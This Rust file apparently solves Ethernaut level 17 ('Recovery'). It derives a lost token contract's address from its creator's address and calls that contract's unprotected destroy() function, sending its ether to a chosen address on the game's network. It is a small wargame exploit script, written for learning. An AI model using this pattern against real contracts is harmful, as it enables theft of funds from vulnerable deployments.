#[allow(unused_imports)]
use alloy::{
    network::{EthereumWallet, TransactionBuilder},
    primitives::{
        Bytes, U256, address, Address,
        utils::{Unit, format_ether},
    },
    providers::{Provider, ProviderBuilder},
    rpc::types::TransactionRequest,
    signers::local::PrivateKeySigner,
    sol,
};

sol!{
    #[sol(rpc)]
    contract SimpleToken {
        function name() external view returns (string);
        function destroy(address payable _to) public;
    }
}

use crate::{ethernaut, utils};
use tokio::runtime::Runtime;

#[allow(dead_code)]
pub fn level17_runner() -> Result<(), Box<dyn std::error::Error>> {
    let rt = Runtime::new()?;
    rt.block_on(test17())?;
    
    Ok(())
}

#[allow(dead_code)]
async fn level17() -> Result<(), Box<dyn std::error::Error>> {
    let alice_signer: PrivateKeySigner = ethernaut::ALICE_KEY.parse()?;
    let bob_signer: PrivateKeySigner = ethernaut::BOB_KEY.parse()?;

    let mut wallet = EthereumWallet::from(alice_signer);
    wallet.register_signer(bob_signer);

    let provider = ProviderBuilder::new()
        .wallet(wallet)
        .connect(ethernaut::RPC)
        .await?;

    let recovery_address = "0x05CceA68Ec40FF3B9516DB0EDE9ECda9BAd32CA8".parse()?;
    let token_address = "0x2D6B682CC4235e91a32fb021b7A93332f10439C1".parse()?;
    let token = SimpleToken::new(
        token_address,
        provider.clone()
    );

    println!("[CHECK]");
    let balance = utils::balance(recovery_address).await?;
    println!("[SimpleToken.balance()]    balance = {}\n", balance);

    let destroy_tx = token.destroy(recovery_address)
        .send()
        .await?;
    println!("[SimpleToken.destroy()]    Panding transaction... {}",
        destroy_tx.tx_hash()
    );

    let destroy_receipt = destroy_tx.get_receipt().await?;
    println!(
        "[SimpleToken.destroy()]    transaction included in block {}\n",
        destroy_receipt.block_number.expect("Failed to get block number")
    );
    
    println!("[CHECK]");
    let balance = utils::balance(recovery_address).await?;
    println!("[SimpleToken.balance()]    balance = {}\n", balance);

    Ok(())
}

#[allow(dead_code)]
async fn test17() -> Result<(), Box<dyn std::error::Error>> {
    let alice_signer: PrivateKeySigner = ethernaut::ALICE_KEY.parse()?;
    let bob_signer: PrivateKeySigner = ethernaut::BOB_KEY.parse()?;

    let mut wallet = EthereumWallet::from(alice_signer);
    wallet.register_signer(bob_signer);
    
    #[allow(unused_variables)]
    let provider = ProviderBuilder::new()
        .wallet(wallet)
        .connect(ethernaut::RPC)
        .await?;
    
    let recovery_address: Address = "0x05CceA68Ec40FF3B9516DB0EDE9ECda9BAd32CA8".parse()?;
    let token_address = recovery_address.create(1);
    println!("[TEST]    {token_address}");
    // let token_address = "0x2D6B682CC4235e91a32fb021b7A93332f10439C1".parse()?;
    
    Ok(())
}
